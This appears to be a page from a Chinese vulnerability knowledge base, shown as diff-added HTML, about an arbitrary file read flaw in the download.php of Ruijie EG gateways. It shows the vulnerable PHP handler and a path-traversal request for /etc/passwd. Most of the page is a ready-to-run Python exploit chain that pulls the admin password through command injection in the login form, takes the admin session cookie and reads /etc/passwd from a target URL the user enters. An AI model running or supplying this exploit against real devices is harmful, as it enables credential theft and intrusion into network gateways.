+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">        return fopen($filename, &#34;rb&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    /**
+</span></span></span><span class="line"><span class="cl"><span class="err">     * 获取文件mime类型
+</span></span></span><span class="line"><span class="cl"><span class="err">     * @param string $fileName 文件名
+</span></span></span><span class="line"><span class="cl"><span class="err">     * @return string
+</span></span></span><span class="line"><span class="cl"><span class="err">     */
+</span></span></span><span class="line"><span class="cl"><span class="err">    private function _getMimeType($fileName) {
+</span></span></span><span class="line"><span class="cl"><span class="err">        $charset = v(&#34;charset&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">        switch (pathinfo($fileName, PATHINFO_EXTENSION)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;pdf&#34;: return &#34;application/pdf&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;exe&#34;: return &#34;application/octet-stream&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;zip&#34;: return &#34;application/zip&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;doc&#34;: return &#34;application/msword&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;xls&#34;: return &#34;application/vnd.ms-excel&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;ppt&#34;: return &#34;application/vnd.ms-powerpoint&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;gif&#34;: return &#34;image/gif&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;png&#34;: return &#34;image/png&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;jpeg&#34;:
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;jpg&#34;: return &#34;image/jpg&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;htm&#34;: return &#34;text/html;charset=gbk&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            case &#34;html&#34;: if(!$charset) {
+</span></span></span><span class="line"><span class="cl"><span class="err">                            return &#34;text/html;charset=gbk&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">                        }else {
+</span></span></span><span class="line"><span class="cl"><span class="err">                            return &#34;text/html;charset=UTF-8&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">                        }
+</span></span></span><span class="line"><span class="cl"><span class="err">            default: return &#34;application/force-download&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    /**
+</span></span></span><span class="line"><span class="cl"><span class="err">     * 获取文件大小
+</span></span></span><span class="line"><span class="cl"><span class="err">     * @return int
+</span></span></span><span class="line"><span class="cl"><span class="err">     */
+</span></span></span><span class="line"><span class="cl"><span class="err">    private function _getFileSize($filePointer) {
+</span></span></span><span class="line"><span class="cl"><span class="err">        $stat = fstat($filePointer);
+</span></span></span><span class="line"><span class="cl"><span class="err">        return $stat[&#39;size&#39;];
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">include_once AROOT.&#39;init.php&#39;;    //mvc初始化入口，放在底部
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>关键代码为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * 读取文本文件内容，支持ajax请求
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">read_txtAction</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">v</span><span class="p">(</span><span class="s2">&#34;file&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;status&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$data</span><span class="p">[</span><span class="s2">&#34;msg&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&#34;不存在&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">json_echo</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$fileContent</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;status&#34;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span> <span class="s2">&#34;data&#34;</span> <span class="o">=&gt;</span> <span class="nv">$fileContent</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">json_echo</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接从Get请求中提取 file参数读取文件，可以使用 <strong>../</strong> 跳转目录</p>
+<p>验证POC</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">/download.php?a=read_txt&amp;file=../../../../etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202110928854.png"
+        data-srcset="/images/202202110928854.png, /images/202202110928854.png 1.5x, /images/202202110928854.png 2x"
+        data-sizes="auto"
+        alt="/images/202202110928854.png"
+        title="/images/202202110928854.png" /></p>
+<h2 id="漏洞poc">漏洞POC</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-*- coding:utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author : PeiQi</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># from   : http://wiki.peiqi.tech</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">title</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mPOC_Des: http://wiki.peiqi.tech                                   </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mGithub : https://github.com/PeiQi0                                 </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34m公众号  : PeiQi文库                                                   </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mVersion: 锐捷EG网关 cli.php RCE                                      </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36m使用格式:  python3 poc.py                                            </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vuln_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&#34;/login.php&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;username=admin&amp;password=admin?show+webmaster+user&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">vuln_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[36m[o] 正在执行 show webmaster user </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target_url</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;data&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">password</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;admin (.*?)&#34;&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[36m[o] 成功获取, 账号密码为:  admin   </span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">POC_2</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vuln_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&#34;/login.php&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;username=admin&amp;password=</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">vuln_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[36m[o] 正在登录..... </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target_url</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;status&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="s2">&#34;1&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ruijie_cookie</span> <span class="o">=</span> <span class="s2">&#34;RUIJIEID=&#34;</span> <span class="o">+</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;&#39;Set-Cookie&#39;: &#39;RUIJIEID=(.*?);&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;;user=admin;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[36m[o] 成功获取管理员Cookie: </span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ruijie_cookie</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">POC_3</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">ruijie_cookie</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">POC_3</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">ruijie_cookie</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vuln_url</span> <span class="o">=</span> <span class="n">target_url</span> <span class="o">+</span> <span class="s2">&#34;/download.php?a=read_txt&amp;file=../../../../etc/passwd&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;Cookie&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ruijie_cookie</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">vuln_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[36m[o] 正在读取 /etc/passwd..... </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target_url</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;root:&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[36m[o] 成功读取 /etc/passwd </span><span class="se">\n</span><span class="s2">[o] 响应为:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">title</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">target_url</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[35mPlease input Attack Url</span><span class="se">\n</span><span class="s2">Url   &gt;&gt;&gt; </span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202110929078.png"
+        data-srcset="/images/202202110929078.png, /images/202202110929078.png 1.5x, /images/202202110929078.png 2x"
+        data-sizes="auto"
+        alt="/images/202202110929078.png"
+        title="/images/202202110929078.png" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" data-title="锐捷 EG易网关 download.php 任意文件读取漏洞" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" data-title="锐捷 EG易网关 download.php 任意文件读取漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" data-title="锐捷 EG易网关 download.php 任意文件读取漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" data-title="锐捷 EG易网关 download.php 任意文件读取漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
